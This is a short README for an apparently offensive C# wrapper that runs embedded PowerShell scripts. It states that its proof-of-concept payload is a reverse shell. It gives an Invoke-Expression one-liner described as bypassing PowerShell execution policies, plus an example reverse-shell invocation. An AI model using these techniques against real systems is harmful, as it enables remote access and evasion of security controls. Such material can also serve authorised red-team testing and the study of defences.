# PowerShellWrapperNET

Really dumb simple WIP C# wrapper for PowerShell tooling. Improvments and revisions will come to make it not suck.

_(Note: current PoC PowerShell script is a simple reverse shell.)_

## Usage

**1. Validate that your target script can be ran with the following PowerShell command:**
```powershell
Invoke-Expression ([string](Get-Content '<temp_script_path>' | % { Write-Output "$_`n" }))
```
_(Note: above command bypasses execution policies and file extensions.)_

**2. If the above command is successful:**
- Add the contents of the target script into the `psScript` variable within `Main()` _(Note: will likely need to adjust quotations and brackets)._
- Add the command needed to execute target script into the `MainFunctoinName` variable within `Main()` _(e.g., `Example-RevShell -IpAddress 127.0.0.1 -Port 443`)._
- Compile source code (current build uses .NET Framework 3.5).

**3. Use a goofy ahhhh WIP tool.**

## OPSEC

Zilcho. None. For now. We'll see. Maybe. Maybe not.
